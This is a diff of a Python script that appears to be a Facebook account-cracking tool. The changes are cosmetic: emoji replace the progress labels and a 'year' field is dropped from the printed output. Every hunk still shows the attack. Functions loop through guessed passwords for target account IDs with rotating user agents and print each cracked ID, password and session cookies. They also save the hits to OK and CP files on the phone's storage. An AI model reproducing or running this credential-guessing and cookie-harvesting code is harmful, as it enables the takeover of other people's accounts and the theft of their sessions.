@@ -1683,7 +1683,7 @@ def validate1(idf,pwv):
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(uaa)
 	ses = requests.Session()
-	prog.update(des,description=f"[bold green]Validate V1[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"[bold green]✨✨[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1820,7 +1820,7 @@ def reguler1(idf,pwv):
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(uaa)
 	ses = requests.Session()
-	prog.update(des,description=f"[bold green]Reguler V1[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"[bold green]☠️☠️[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1877,7 +1877,7 @@ def reguler1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='KUY-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1887,7 +1887,7 @@ def reguler1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='KUY-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1906,7 +1906,7 @@ def reguler2(idf,pwv):
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(uaa)
 	ses = requests.Session()
-	prog.update(des,description=f"[bold green]B-Api[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"[bold green]👹👹[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1938,7 +1938,7 @@ def reguler2(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='DUH-CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1947,7 +1947,7 @@ def reguler2(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='DUH-CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1960,7 +1960,7 @@ def reguler2(idf,pwv):
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					user = re.findall("c_user=(\d+)",coki)[0]
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {coki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {coki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='NICE-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1970,7 +1970,7 @@ def reguler2(idf,pwv):
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					user = re.findall("c_user=(\d+)",coki)[0]
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {coki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {coki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='NICE-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1989,7 +1989,7 @@ def kontol(idf,pwv):
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(uaa)
 	ses = requests.Session()
-	prog.update(des,description=f"[bold green]Async[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"[bold green]💥💥[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -2026,7 +2026,7 @@ def kontol(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='🙄-CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2035,7 +2035,7 @@ def kontol(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='🙄-CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2048,7 +2048,7 @@ def kontol(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='NICE-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2058,7 +2058,7 @@ def kontol(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='NICE-OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2077,7 +2077,7 @@ def bapi(idf,pwv):
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(uaa)
 	ses = requests.Session()
-	prog.update(des,description=f"[bold green]M-Alpha[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"[bold green]🤡🤡[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -2114,7 +2114,7 @@ def bapi(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='🙄🙄')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2123,7 +2123,7 @@ def bapi(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='🙄🙄')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2136,7 +2136,7 @@ def bapi(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='😎😎😎')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2146,7 +2146,7 @@ def bapi(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='😎😎😎')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2165,7 +2165,7 @@ def colmek1(idf,pwv):
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(uaa)
 	ses = requests.Session()
-	prog.update(des,description=f"[bold green]X[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"[bold green]🐉[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -2183,7 +2183,7 @@ def colmek1(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='🙄🙄🙄')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2192,7 +2192,7 @@ def colmek1(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='🙄🙄🙄')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2205,7 +2205,7 @@ def colmek1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='😎😎😎')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2215,7 +2215,7 @@ def colmek1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='😎😎😎')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2234,7 +2234,7 @@ def colmek2(idf,pwv):
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(uaa)
 	ses = requests.Session()
-	prog.update(des,description=f"[bold green]D[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"[bold green]🐉[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -2252,7 +2252,7 @@ def colmek2(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='🙄🙄🙄')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2261,7 +2261,7 @@ def colmek2(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold cyan', title='🙄🙄🙄')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2274,7 +2274,7 @@ def colmek2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='🤤🤤🤤')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2284,7 +2284,7 @@ def colmek2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] Tahun : {cektahun}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold cyan', title='🤤🤤🤤')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
